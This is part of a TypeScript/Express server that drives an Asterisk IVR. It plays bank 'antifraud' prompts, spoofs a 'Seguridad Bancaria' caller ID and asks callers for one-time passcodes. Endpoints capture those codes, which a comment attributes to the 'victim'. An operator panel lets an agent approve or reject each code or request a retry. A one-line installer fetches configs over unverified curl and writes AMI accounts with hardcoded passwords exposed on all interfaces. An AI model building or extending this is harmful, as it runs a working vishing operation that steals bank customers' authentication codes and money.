      wait,
      success,
      agent,
    });

    res.json({
      success: true,
      message: 'Audios del IVR sincronizados permanentemente en Asterisk AstDB.',
      assigned: { intro, prompt, wait, success, agent },
      targets: Array.from(targets),
    });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Endpoint to retrieve active audio configuration from Asterisk AstDB
app.get('/api/asterisk/audio/config', (req, res) => {
  exec(`asterisk -rx 'database show ivr_vars'`, (err, stdout) => {
    const audios: Record<string, string> = {};
    if (!err && stdout) {
      const lines = stdout.split('\n');
      for (const line of lines) {
        // Line format: /ivr_vars/key : value
        const match = line.match(/^\/ivr_vars\/([^\s:]+)\s*:\s*(.+)$/);
        if (match) {
          const key = match[1].trim();
          const val = match[2].trim().replace(/^"|"$/g, '');
          audios[key] = val;
        }
      }
    }

    res.json({
      success: true,
      audios: {
        intro: audios['default_intro'] || audios['8888_intro'] || audios['global_intro'] || 'custom/banrearreglado',
        prompt: audios['default_prompt'] || audios['8888_prompt'] || audios['global_prompt'] || 'custom/solicitar_codigo_otp',
        wait: audios['default_wait'] || audios['8888_wait'] || audios['global_wait'] || 'custom/un_momento_validando_informacion',
        success: audios['default_success'] || audios['8888_success'] || audios['global_success'] || 'custom/operacion_bloqueada_exito',
        agent: audios['default_agent'] || audios['8888_agent'] || audios['global_agent'] || 'custom/conectar_asesor_banco',
      },
      allKeys: audios,
    });
  });
});

// Verify if an audio file exists physically in Asterisk sounds directory
app.all('/api/asterisk/audio/verify', (req, res) => {
  const audioPath = (req.query.path as string) || (req.body && req.body.path) || '';
  if (!audioPath) {
    return res.status(400).json({ success: false, exists: false, error: 'Ruta no especificada' });
  }

  // Asterisk sounds typically reside in SOUNDS_CUSTOM_DIR or /var/lib/asterisk/sounds/
  const cleanName = audioPath.replace(/^custom\//, '').replace(/\.[^/.]+$/, '').trim();
  const candidates = [
    path.join(SOUNDS_CUSTOM_DIR, `${cleanName}.wav`),
    path.join(SOUNDS_CUSTOM_DIR, `${cleanName}.gsm`),
    path.join(SOUNDS_CUSTOM_DIR, `${cleanName}.sln`),
    path.join(SOUNDS_CUSTOM_DIR, `${cleanName}.mp3`),
    path.join('/var/lib/asterisk/sounds/en', `${cleanName}.wav`),
    path.join('/var/lib/asterisk/sounds/es', `${cleanName}.wav`),
    path.join('/var/lib/asterisk/sounds', `${cleanName}.wav`),
  ];

  let found = false;
  let matchedPath = '';
  for (const c of candidates) {
    if (fs.existsSync(c)) {
      found = true;
      matchedPath = c;
      break;
    }
  }

  // If HEAD request, set headers and return immediately
  if (req.method === 'HEAD') {
    if (found) {
      res.setHeader('X-Audio-Exists', 'true');
      res.setHeader('X-Audio-Path', matchedPath);
      return res.status(200).end();
    } else {
      res.setHeader('X-Audio-Exists', 'false');
      return res.status(404).end();
    }
  }

  return res.json({
    success: true,
    exists: found,
    path: audioPath,
    cleanName,
    matchedPath: found ? matchedPath : null,
  });
});

// Download raw audio file for Asterisk sounds directory (/var/lib/asterisk/sounds/custom/...)
app.get('/api/asterisk/audio/raw/:name', (req, res) => {
  const rawName = req.params.name.replace(/\.[^/.]+$/, '').replace(/[^a-zA-Z0-9_-]/g, '');
  const wavPath = path.join(SOUNDS_CUSTOM_DIR, `${rawName}.wav`);
  const gsmPath = path.join(SOUNDS_CUSTOM_DIR, `${rawName}.gsm`);

  if (fs.existsSync(wavPath)) {
    return res.sendFile(wavPath);
  }
  if (fs.existsSync(gsmPath)) {
    return res.sendFile(gsmPath);
  }

  // Generate Asterisk 8kHz PCM WAV on the fly with distinct frequencies
  let freq = 520;
  if (rawName.includes('otp')) freq = 680;
  if (rawName.includes('validando') || rawName.includes('wait')) freq = 440;
  if (rawName.includes('exito') || rawName.includes('success')) freq = 880;
  if (rawName.includes('asesor') || rawName.includes('agent')) freq = 587;

  const wavBuffer = generatePcm8kWaveBuffer(3.5, freq);
  res.setHeader('Content-Type', 'audio/wav');
  res.setHeader('Content-Disposition', `attachment; filename="${rawName}.wav"`);
  res.send(wavBuffer);
});

// Universal 1-liner bash installer for remote VPS vmi3461829
app.get('/api/asterisk/install.sh', (req, res) => {
  const host = req.get('host') || 'localhost:3000';
  const proto = req.protocol || 'http';
  const baseUrl = `${proto}://${host}`;

  const bashScript = `#!/usr/bin/env bash
# ==========================================================
# Sincronización Automática Asterisk con Plataforma Web
# Servidor: ${baseUrl}
# ==========================================================
set -e

echo "=== [1/5] Preparando directorios de Asterisk ==="
mkdir -p /etc/asterisk
mkdir -p /var/lib/asterisk/sounds/custom

echo "=== [2/5] Descargando dialplan extensions.conf y pjsip.conf actualizado ==="
if [ -f /etc/asterisk/extensions.conf ]; then
  cp /etc/asterisk/extensions.conf /etc/asterisk/extensions.conf.bak_$(date +%s)
fi
curl -sSLk "${baseUrl}/api/asterisk/config/extensions.conf" -o /etc/asterisk/extensions.conf

if [ -f /etc/asterisk/pjsip.conf ]; then
  cp /etc/asterisk/pjsip.conf /etc/asterisk/pjsip.conf.bak_$(date +%s)
fi
curl -sSLk "${baseUrl}/api/asterisk/config/pjsip.conf" -o /etc/asterisk/pjsip.conf

# Configuración segura de AMI para sammy y admin
cat << 'EOF_MGR' > /etc/asterisk/manager.conf
[general]
enabled = yes
port = 5038
bindaddr = 0.0.0.0

[sammy]
secret = Robert2026RDTGcvgbsg
read = all
write = all

[admin]
secret = mysecretpass
read = all
write = all
EOF_MGR

echo "=== [3/5] Descargando y verificando audios de IVR en /var/lib/asterisk/sounds/custom/ ==="
AUDIOS=("alerta_banco_antifraude" "solicitar_codigo_otp" "digite_token_6_digitos" "token_invalido_reintente" "un_momento_validando_informacion" "operacion_bloqueada_exito" "conectar_asesor_banco" "bienvenida_corporativa" "prompt_otp_6_digitos" "bienvenida_7777" "bienvenida_6666" "bienvenida_5555" "bienvenida_4444" "bienvenida_3333")
for aud in "\${AUDIOS[@]}"; do
  if [ ! -s "/var/lib/asterisk/sounds/custom/\${aud}.wav" ] && [ ! -s "/var/lib/asterisk/sounds/custom/\${aud}.gsm" ]; then
    echo "  -> Obteniendo audio: \${aud}.wav..."
    curl -sSLk "\${baseUrl}/api/asterisk/audio/raw/\${aud}" -o "/var/lib/asterisk/sounds/custom/\${aud}.wav" || true
  fi
done

echo "=== [4/5] Configurando base de datos interna AstDB ==="
asterisk -rx 'database put ivr_vars default_intro custom/alerta_banco_antifraude' || true
asterisk -rx 'database put ivr_vars default_prompt custom/solicitar_codigo_otp' || true
asterisk -rx 'database put ivr_vars default_wait custom/un_momento_validando_informacion' || true
asterisk -rx 'database put ivr_vars default_success custom/operacion_bloqueada_exito' || true
asterisk -rx 'database put ivr_vars default_agent custom/conectar_asesor_banco' || true

asterisk -rx 'database put ivr_vars 7777_intro custom/bienvenida_7777' || true
asterisk -rx 'database put ivr_vars 7777_prompt custom/bienvenida_7777' || true
asterisk -rx 'database put ivr_vars 777_intro custom/bienvenida_7777' || true
asterisk -rx 'database put ivr_vars 777_prompt custom/bienvenida_7777' || true

asterisk -rx 'database put ivr_vars 6666_intro custom/bienvenida_6666' || true
asterisk -rx 'database put ivr_vars 6666_prompt custom/bienvenida_6666' || true
asterisk -rx 'database put ivr_vars 666_intro custom/bienvenida_6666' || true
asterisk -rx 'database put ivr_vars 666_prompt custom/bienvenida_6666' || true

asterisk -rx 'database put ivr_vars 5555_intro custom/bienvenida_5555' || true
asterisk -rx 'database put ivr_vars 5555_prompt custom/bienvenida_5555' || true
asterisk -rx 'database put ivr_vars 555_intro custom/bienvenida_5555' || true
asterisk -rx 'database put ivr_vars 555_prompt custom/bienvenida_5555' || true

asterisk -rx 'database put ivr_vars 4444_intro custom/bienvenida_4444' || true
asterisk -rx 'database put ivr_vars 4444_prompt custom/bienvenida_4444' || true
asterisk -rx 'database put ivr_vars 444_intro custom/bienvenida_4444' || true
asterisk -rx 'database put ivr_vars 444_prompt custom/bienvenida_4444' || true

asterisk -rx 'database put ivr_vars 3333_intro custom/bienvenida_3333' || true
asterisk -rx 'database put ivr_vars 3333_prompt custom/bienvenida_3333' || true
asterisk -rx 'database put ivr_vars 333_intro custom/bienvenida_3333' || true
asterisk -rx 'database put ivr_vars 333_prompt custom/bienvenida_3333' || true

asterisk -rx 'database put ivr_vars 8888_intro custom/alerta_banco_antifraude' || true
asterisk -rx 'database put ivr_vars 8888_prompt custom/solicitar_codigo_otp' || true
asterisk -rx 'database put ivr_vars 8888_wait custom/un_momento_validando_informacion' || true
asterisk -rx 'database put ivr_vars 8888_success custom/operacion_bloqueada_exito' || true
asterisk -rx 'database put ivr_vars 8888_agent custom/conectar_asesor_banco' || true
asterisk -rx 'database put ivr_vars 8888_agent_exten 1001' || true

asterisk -rx 'database put 16104803845_intro custom/alerta_banco_antifraude' || true
asterisk -rx 'database put 16104803845_prompt custom/solicitar_codigo_otp' || true
asterisk -rx 'database put 16104803845_wait custom/un_momento_validando_informacion' || true

asterisk -rx 'database put extension_cid 1001/number "+18005550199"' || true
asterisk -rx 'database put extension_cid 1001/name "Seguridad Bancaria"' || true

echo "=== [5/5] Recargando Manager, Dialplan y PJSIP en caliente ==="
asterisk -rx 'manager reload' || true
asterisk -rx 'dialplan reload' || true
asterisk -rx 'pjsip reload' || true

echo ""
echo "=========================================================="
echo " ¡SINCRONIZACION EXITOSA CON ASTERISK!"
echo " 1. Dialplan /etc/asterisk/extensions.conf cargado."
echo " 2. Eliminado 'Anonymous' con subrutina pre-dial de PJSIP."
echo " 3. Audios de IVR activos en /var/lib/asterisk/sounds/custom/."
echo " 4. Flujo OTP configurado para validacion manual del asesor."
echo " Puedes probar marcando 8888 desde el softphone o desde la web."
echo "=========================================================="
`;

  res.setHeader('Content-Type', 'text/x-shellscript');
  res.send(bashScript);
});

// In-memory buffer for captured OTPs in production
interface CapturedOtpItem {
  id: string;
  number: string;
  otp: string;
  timestamp: string;
  createdAt?: number;
  channel?: string;
  service?: string;
  status: 'valid' | 'invalid' | 'pending';
}

let capturedOtpHistory: CapturedOtpItem[] = [];
let lastAstDbSyncTime = 0;
let isSyncingAstDb = false;

// Endpoint to receive OTP captures from Asterisk curl (GET or POST) or AMI
app.all('/api/asterisk/otp/capture', (req, res) => {
  const number = req.body?.number || req.query?.number;
  const otp = req.body?.otp || req.query?.otp;
  const channel = req.body?.channel || req.query?.channel;
  const service = req.body?.service || req.query?.service || 'Banco / Antifraude';
  const status = req.body?.status || req.query?.status || 'pending';

  if (otp) {
    const cleanNumber = (number && number !== '<unknown>') ? String(number).trim() : '8888';
    const cleanOtp = String(otp).trim();
    const cleanStatus = (status === 'valid' || status === 'invalid') ? status : 'pending';

    // Bring or create to the very top (index 0)
    const existingIndex = capturedOtpHistory.findIndex((r) => r.number === cleanNumber && r.otp === cleanOtp);
    let record: CapturedOtpItem;
    if (existingIndex >= 0) {
      record = capturedOtpHistory.splice(existingIndex, 1)[0];
      record.timestamp = new Date().toLocaleTimeString();
      record.status = cleanStatus;
      record.channel = channel ? String(channel) : record.channel;
    } else {
      record = {
        id: 'otp-' + Date.now() + '-' + Math.random().toString(36).substring(2, 6),
        number: cleanNumber,
        otp: cleanOtp,
        timestamp: new Date().toLocaleTimeString(),
        channel: channel ? String(channel) : 'PJSIP',
        service: service ? String(service) : 'Banco / Antifraude',
        status: cleanStatus,
      };
    }
    capturedOtpHistory.unshift(record);
    if (capturedOtpHistory.length > 300) capturedOtpHistory.pop();
    lastAstDbSyncTime = 0; // Invalidate cache so polling gets updated immediately

    console.log(`[PRODUCCIÓN] ⭐ ¡NUEVO CÓDIGO OTP CAPTURADO!: [${cleanOtp}] - Tel: ${cleanNumber}`);

    // Synchronize to Asterisk AstDB in background
    executeAsteriskCommand(`database put otp_codes "${cleanNumber}" "${cleanOtp}"`).catch(() => {});
    executeAsteriskCommand(`database put otp_status "${cleanNumber}" "${cleanStatus}"`).catch(() => {});
  }
  res.json({ success: true, count: capturedOtpHistory.length, records: capturedOtpHistory.slice(0, 10) });
});

// Endpoint for agent to decide if captured OTP is valid or invalid
app.post('/api/asterisk/otp/decision', async (req, res) => {
  try {
    const { id, otp, number, status, action } = req.body;
    if (!status || (status !== 'valid' && status !== 'invalid')) {
      return res.status(400).json({ success: false, error: 'El estado debe ser "valid" o "invalid"' });
    }

    if (id) {
      const match = capturedOtpHistory.find((r) => r.id === id);
      if (match) match.status = status;
    } else if (number && otp) {
      const match = capturedOtpHistory.find((r) => r.number === number && r.otp === otp);
      if (match) match.status = status;
    } else if (number) {
      const match = capturedOtpHistory.find((r) => r.number === number);
      if (match) match.status = status;
    } else if (otp) {
      const match = capturedOtpHistory.find((r) => r.otp === otp);
      if (match) match.status = status;
    }

    lastAstDbSyncTime = 0; // Force immediate refresh

    if (number) {
      await executeAsteriskCommand(`database put otp_status "${number}" "${status}"`);

      if (action === 'request_retry') {
        // Clear capture from AstDB so victim can enter new OTP
        await executeAsteriskCommand(`database del otp_codes "${number}"`);
        await executeAsteriskCommand(`database del otp_captures "${number}"`);
      }
    }

    console.log(`[DECISIÓN AGENTE] OTP ${otp || ''} para ${number || 'destino'} marcado como: [${status.toUpperCase()}]`);

    res.json({
      success: true,
      message: `Código marcado como ${status === 'valid' ? 'VÁLIDO (Aprobado)' : 'INVÁLIDO (Rechazado)'} por el agente.`,
      status,
    });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Endpoint to list all captured OTP records
app.get('/api/asterisk/otp/records', async (req, res) => {
  const forceFresh = req.query.fresh === '1' || req.query.fresh === 'true';
  const shouldClear = req.query.clear === '1' || req.query.clear === 'true';

  if (shouldClear) {
    capturedOtpHistory = [];
    lastAstDbSyncTime = Date.now();
    try {
      await executeAsteriskCommand('database deltree otp_codes');
      await executeAsteriskCommand('database deltree otp_status');
      await executeAsteriskCommand('database deltree captured_otp');
      await executeAsteriskCommand('database deltree otp_captures');
      await executeAsteriskCommand('database deltree otp_decision');
      await executeAsteriskCommand('database deltree otp_last_status');
    } catch (_) {}
    return res.json({ success: true, records: [] });
  }

  const now = Date.now();

  // Si ya se sincronizó hace menos de 2000ms y no se fuerza refresh, devolver en memoria
  if (!forceFresh && (now - lastAstDbSyncTime < 2000 || isSyncingAstDb)) {
    return res.json({ success: true, records: capturedOtpHistory });
  }

  isSyncingAstDb = true;
  // Sincronizar también con la base interna AstDB de Asterisk (local o VPS remoto)
  try {
    const codesOutput = await executeAsteriskCommand('database show otp_codes');
    const statusOutput = await executeAsteriskCommand('database show otp_status');

    const statusMap: Record<string, 'valid' | 'invalid' | 'pending'> = {};
    if (statusOutput) {
      const sLines = statusOutput.split('\n');
      for (const line of sLines) {
        const clean = line.replace(/^Output:\s*/, '').trim();
        const m = clean.match(/^\/otp_status\/([^\s:]*)\s*:\s*([a-zA-Z]+)/);
        if (m) {
          const num = m[1].trim();
          const st = m[2].trim().toLowerCase();
          if (st === 'valid' || st === 'invalid' || st === 'pending') {
            statusMap[num] = st;
          }
        }
      }
    }

    if (codesOutput) {
      const lines = codesOutput.split('\n');
      for (const line of lines) {
        const cleanLine = line.replace(/^Output:\s*/, '').trim();
        const match = cleanLine.match(/^\/otp_codes\/([^\s:]+)\s*:\s*([0-9*#]+)/);
        if (match) {
          const num = match[1].trim();
          const code = match[2].trim();
          const currentStatus = statusMap[num] || 'pending';
          const existingIndex = capturedOtpHistory.findIndex((r) => r.number === num && r.otp === code);

          if (existingIndex >= 0) {
            // Actualizar status si cambió
            capturedOtpHistory[existingIndex].status = currentStatus;
          } else {
            // Nuevo registro detectado desde AstDB -> ponerlo al frente
            capturedOtpHistory.unshift({
              id: 'astdb-' + num + '-' + code,
              number: num,
              otp: code,
              timestamp: new Date().toLocaleTimeString(),
              createdAt: Date.now(),
              channel: 'Ext. 7777',
              service: 'Banco / Antifraude (7777)',
              status: currentStatus,
            });
            if (capturedOtpHistory.length > 300) capturedOtpHistory.pop();
          }
        }
      }
    }

    // Actualizar estados sincronizados desde AstDB para todos los registros
    for (const r of capturedOtpHistory) {
      if (statusMap[r.number]) {
        r.status = statusMap[r.number];
      }
    }
    lastAstDbSyncTime = Date.now();
  } catch (err: any) {
    console.warn('AstDB sync warning:', err.message);
  } finally {
    isSyncingAstDb = false;
  }

  res.json({ success: true, records: capturedOtpHistory });
});

// Endpoint to delete/clear captured records and wipe old tests from Asterisk AstDB
app.all(['/api/asterisk/otp/records/clear', '/api/asterisk/otp/records'], async (req, res, next) => {
  if (req.method !== 'DELETE' && req.path !== '/api/asterisk/otp/records/clear') {
    return next();
  }
  capturedOtpHistory = [];
  lastAstDbSyncTime = Date.now();
  try {
    await executeAsteriskCommand('database deltree otp_codes');
    await executeAsteriskCommand('database deltree otp_status');
    await executeAsteriskCommand('database deltree captured_otp');
    await executeAsteriskCommand('database deltree otp_captures');
    await executeAsteriskCommand('database deltree otp_decision');
    await executeAsteriskCommand('database deltree otp_last_status');
  } catch (_) {}
  console.log('[PRODUCCIÓN] Limpieza total de códigos y AstDB completada.');
  res.json({ success: true, message: 'Historial y registros de pruebas anteriores eliminados de memoria y de Asterisk.' });
});

// Endpoint to inspect live channels on Asterisk with structured channel parsing
app.get('/api/asterisk/live/channels', async (req, res) => {
  try {
    let amiOutput = await executeAsteriskCommand('core show channels concise');
    if (!amiOutput) {
      amiOutput = await sendAmiAction('127.0.0.1', 5038, 'sammy', 'Robert2026RDTGcvgbsg', [
        'core show channels concise',
      ]);
    }

    const parsedChannels: any[] = [];
    if (amiOutput) {
      const lines = amiOutput.split('\n');
      for (const line of lines) {
        const trimmed = line.trim();
        if (!trimmed || trimmed.startsWith('Output:') || trimmed.startsWith('Privilege:')) continue;
        const parts = trimmed.split('!');
        if (parts.length >= 7) {
          parsedChannels.push({
            channel: parts[0] || '',
            context: parts[1] || '',
            extension: parts[2] || '',
            priority: parts[3] || '',
            state: parts[4] || '',
            application: parts[5] || '',
            data: parts[6] || '',
            callerId: parts[7] || '',
            duration: parts[10] || '',
            bridgedChannel: parts[11] || '',
          });
        }
      }
    }

    res.json({ success: true, channels: parsedChannels, raw: amiOutput });
  } catch (err: any) {
    res.json({ success: false, channels: [], raw: '', error: err.message });
  }
});

// Endpoint to query current state of a destination number
app.get('/api/asterisk/call/status', (req, res) => {
  const number = String(req.query.number || '').trim().replace(/[^0-9]/g, '');
  if (!number) {
    return res.json({ success: true, calls: Array.from(callStatusStore.values()) });
  }
  const clean10 = number.length === 11 && number.startsWith('1') ? number.substring(1) : number;
  const state = callStatusStore.get(number) || callStatusStore.get(clean10) || callStatusStore.get(`1${clean10}`);
  res.json({ success: true, call: state || null });
});

// Real-time status update from dialplan (e.g. hangup 'h' or AMD answering machine detected)
app.all('/api/asterisk/call/status/update', (req, res) => {
  const number = String(req.query.number || req.body?.number || '').trim().replace(/[^0-9]/g, '');
  const status = String(req.query.status || req.body?.status || 'ended').trim();
  const cause = String(req.query.cause || req.body?.cause || '').trim();
  const channel = String(req.query.channel || req.body?.channel || '').trim();

  if (number) {
    const clean10 = number.length === 11 && number.startsWith('1') ? number.substring(1) : number;
    const callState: CallState = {
      number,
      channel,
      status: status as any,
      cause,
      timestamp: Date.now(),
    };
    callStatusStore.set(number, callState);
    callStatusStore.set(clean10, callState);
    callStatusStore.set(`1${clean10}`, callState);
    console.log(`[CALL STATUS NOTIFIER] Destino ${number} -> Estado: ${status} (Causa: ${cause}, Canal: ${channel})`);
  }
  res.json({ success: true });
});

// Endpoint to hangup an active call
app.post('/api/asterisk/call/hangup', async (req, res) => {
  const { channel, number } = req.body;
  try {
    if (number) {
      const clean10 = String(number).replace(/[^0-9]/g, '');
      const endedState: CallState = {
        number: clean10,
        channel: channel || '',
        status: 'ended',
        cause: 'Operador colgo en UI',
        timestamp: Date.now(),
      };
      callStatusStore.set(clean10, endedState);
      callStatusStore.set(`1${clean10}`, endedState);
    }
    const cmd = channel ? `channel request hangup ${channel}` : 'channel request hangup all';
    await executeAsteriskCommand(cmd);
    res.json({ success: true, message: `Canal ${channel || 'todos'} colgado` });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// ==========================================
// VITE MIDDLEWARE (DEV) & STATIC FALLBACK (PROD)
// ==========================================

async function startServer() {
  if (process.env.NODE_ENV !== 'production' && !fs.existsSync(path.join(process.cwd(), 'dist', 'index.html'))) {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    // Cache static assets (JS, CSS, images, audio, webfonts) for 1 year immutable
    app.use('/assets', express.static(path.join(distPath, 'assets'), {
      maxAge: '1y',
      immutable: true,
      etag: true,
    }));

    // Cache generic static public files
    app.use(express.static(distPath, {
      maxAge: '1h',
      etag: true,
    }));

    // SPA fallback: index.html should revalidate so updates are immediate
    app.get('*', (req, res) => {
      res.setHeader('Cache-Control', 'no-cache, must-revalidate');
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Asterisk 20 Governor Server running on http://0.0.0.0:${PORT}`);
    // Ensure Asterisk directory structure exists
    try {
      if (!fs.existsSync('/etc/asterisk')) {
        fs.mkdirSync('/etc/asterisk', { recursive: true, mode: 0o755 });
      }
    } catch (_) {}
    // Auto-verify and provision default 8kHz audios on startup
    try {
      ensureCustomAudioFilesExist();
      applyAllActiveAssignmentsToAsterisk();
    } catch (e: any) {
      console.warn('Initial audio check warning:', e.message);
    }
    // Auto-verify and repair Asterisk PJSIP configuration for extensions 1001 & 1002
    try {
      autoRepairAsteriskPjsipOnStartup();
    } catch (e: any) {
      console.warn('Initial PJSIP check warning:', e.message);
    }
  });
}

startServer();
